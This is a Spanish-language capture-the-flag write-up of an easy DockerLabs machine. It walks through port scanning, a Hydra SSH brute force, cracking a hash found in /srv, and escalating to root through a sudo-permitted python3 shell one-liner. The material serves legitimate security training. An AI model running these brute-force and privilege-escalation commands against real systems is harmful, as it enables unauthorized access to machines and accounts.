## Write-up 13: Escalada de privilegios básica y hash cracking

**Sitio:** DockerLabs  
**Dificultad:** Fácil  
**Fecha:** 13/06/2025  
**Aprendizaje:**  
* Refuerzo del uso de escalada de privilegios mediante Python.  
* Aplicación de ingeniería inversa sencilla con *hash cracking* usando [Crackstation.net](https://crackstation.net/).  

---

### 1 - Escaneo de puertos y detección de servicios  

`sudo nmap -sSV -O --open 172.17.0.2`  

**Servicios detectados:**

* 22/tcp open → SSH (OpenSSH 9.2p1 Debian)  
* 80/tcp open → HTTP (Apache 2.4.62)  

---

### 2 - Ataque de fuerza bruta con Hydra  

La web revelaba el nombre de usuario `a`, entonces:  

`hydra -l a -P /usr/share/wordlists/rockyou.txt -V ssh://172.17.0.2`  

**Credenciales obtenidas:**

* Usuario: `a`  
* Contraseña: `secret`  

---

### 3 - Búsqueda de binarios con bit SUID

Una vez dentro:  

`find / -perm -4000 -type f 2>/dev/null`  

**Binarios detectados:** Ninguno útil para escalar directamente (su, chfn, mount, etc.).  

---

### 4 - Exploración de archivos relevantes  

Accedo al directorio `/srv/`:  

`cd /srv/`  

**Archivos interesantes:**  

* `hash_spencer.txt`  
* `clave_aes.txt`, `cifrado_aes.enc`    
* `mensaje_rsa.enc`, `clave_privada.pem` y `clave_publica.pem`    
* Entre otros...    

---

### 5 - Crackeo del hash  

Copio el contenido de `hash_spencer.txt` y lo decodifico en [crackstation.net](https://crackstation.net/).  

**Resultado:**  

* Usuario: `spencer`  
* Contraseña: `password1`  

---

### 6 - Escalada de privilegios con Python  

Una vez conectado como `spencer`, ejecuto:  

`sudo -l`  

**Salida:**  

`(ALL) NOPASSWD: /usr/bin/python3`  

Permite ejecutar Python con sudo sin contraseña.

---

### 7 - Obtención de shell como root  

`sudo /usr/bin/python3 -c 'import os; os.system("/bin/bash")'`  

---

### 8 - Confirmación

> whoami = `root`
